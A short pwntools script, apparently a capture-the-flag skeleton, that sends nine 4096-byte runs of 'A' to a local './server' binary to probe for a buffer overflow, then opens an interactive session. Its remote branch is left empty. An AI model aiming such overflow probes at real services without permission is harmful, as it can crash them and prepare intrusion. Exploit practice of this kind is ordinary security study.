from pwn import *
context(os = 'linux',arch = 'amd64', log_level = 'debug')
debug = 1
if debug == 1:
	p = process('./server')
else:
	p = remote()
p.recvuntil('port')
p.sendline('A' * 0x1000)
p.sendline('A' * 0x1000)
p.sendline('A' * 0x1000)
p.sendline('A' * 0x1000)
p.sendline('A' * 0x1000)
p.sendline('A' * 0x1000)
p.sendline('A' * 0x1000)
p.sendline('A' * 0x1000)
p.sendline('A' * 0x1000)
p.interactive()
